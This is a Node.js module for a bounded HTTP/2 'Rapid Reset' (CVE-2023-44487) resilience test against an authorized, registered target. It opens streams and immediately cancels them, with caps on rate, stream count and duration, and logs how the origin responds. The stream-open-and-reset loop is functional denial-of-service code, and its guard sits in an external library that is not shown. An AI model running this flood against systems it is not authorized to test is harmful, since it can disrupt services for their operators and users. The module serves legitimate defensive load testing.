import http2 from 'node:http2';
import { assertAuthorizedTarget, verifyControl, clampToCaps, normalizeHost } from '../lib/target-guard.mjs';

// Bounded HTTP/2 "Rapid Reset" resilience-test module (CVE-2023-44487 shape).
//
// It opens HTTP/2 streams and immediately cancels them (RST_STREAM) at a capped
// rate for a capped duration, to MEASURE how a protected origin copes with
// stream-churn pressure (does it cap concurrent streams, send GOAWAY, shed, or
// error out?). It is a governed test, not a weapon:
//   - it can only reach a target that passes the authorization gate
//     (lib/target-guard.mjs) — an unregistered host is refused, fail-closed;
//   - every parameter is clamped to the target's caps AND to absolute ceilings;
//   - it never spoofs a source and opens ordinary sockets from a known egress.
//
// Default use is the loopback h2 test target (external/h2-test-target.mjs); the
// external path is only reachable for a proven-authorized target such as bank.cz.

// Absolute, non-negotiable ceilings (defense in depth, on top of per-target caps).
export const HARD = Object.freeze({ MAX_RPS: 500, MAX_STREAMS: 20000, MAX_DURATION_SEC: 120, MAX_CONCURRENCY: 256 });

function clampToHard(p) {
  return {
    rps: Math.min(p.rps || 0, HARD.MAX_RPS),
    streams: Math.min(p.streams || 0, HARD.MAX_STREAMS),
    durationSec: Math.min(p.durationSec || 0, HARD.MAX_DURATION_SEC),
    concurrency: Math.min(p.concurrency || 0, HARD.MAX_CONCURRENCY),
  };
}

/**
 * Run a bounded rapid-reset test.
 * @param {object} o
 * @param {string} o.url        target URL (http[s]://host[:port]/path)
 * @param {Map}    o.registry   authorized-target registry (target-guard)
 * @param {object} [o.requested] { rps, streams, durationSec, concurrency }
 * @param {number} [o.now]
 * @param {boolean}[o.verify]   also require a live domain-control TXT token
 * @param {object} [o.resolver] DNS resolver (for verify), injectable
 * @returns {Promise<object>} run summary
 */
export async function runRapidReset({ url, registry, requested = {}, now = Date.now(), verify = false, resolver } = {}) {
  const u = new URL(url);
  const host = normalizeHost(u.hostname);

  // HARD GATE — before any socket is opened.
  const entry = assertAuthorizedTarget(host, { registry, now });
  if (verify) await verifyControl(entry, resolver ? { resolver } : undefined);

  const capped = clampToHard(clampToCaps(requested, entry.caps || {}));
  const { rps, streams: maxStreams, durationSec, concurrency } = capped;
  if (rps < 1 || maxStreams < 1 || durationSec < 1) {
    throw new Error('effective test parameters collapsed to zero after clamping to caps');
  }

  const stats = { target: host, opened: 0, resetsSent: 0, responses: 0, errors: 0, goaway: false };
  const client = http2.connect(u.origin);
  client.on('error', () => { stats.errors++; });
  client.on('goaway', () => { stats.goaway = true; });

  const started = Date.now();
  const TICK_MS = 100;
  const perTick = Math.max(1, Math.round((rps * TICK_MS) / 1000));

  await new Promise((resolve) => {
    let inflight = 0;
    const timer = setInterval(() => {
      const overTime = Date.now() - started >= durationSec * 1000;
      const overStreams = stats.opened >= maxStreams;
      if (overTime || overStreams || client.destroyed || stats.goaway) {
        clearInterval(timer);
        client.close(() => resolve());
        return;
      }
      for (let i = 0; i < perTick && stats.opened < maxStreams && inflight < concurrency; i++) {
        let req;
        try {
          req = client.request({ ':path': u.pathname || '/', ':method': 'GET' });
        } catch {
          stats.errors++;
          continue;
        }
        stats.opened++;
        inflight++;
        req.on('response', () => { stats.responses++; });
        req.on('error', () => { stats.errors++; });
        req.on('close', () => { inflight--; });
        // The defining move: cancel the stream immediately -> RST_STREAM.
        req.close(http2.constants.NGHTTP2_CANCEL);
        stats.resetsSent++;
      }
    }, TICK_MS);
  });

  const durationMs = Date.now() - started;
  const summary = {
    kind: 'http2-rapid-reset',
    ...stats,
    requested,
    effective: capped,
    durationMs,
    effectiveRps: Math.round((stats.opened / durationMs) * 1000),
  };
  console.log(JSON.stringify({ event: 'rapid-reset.complete', ...summary }));
  return summary;
}
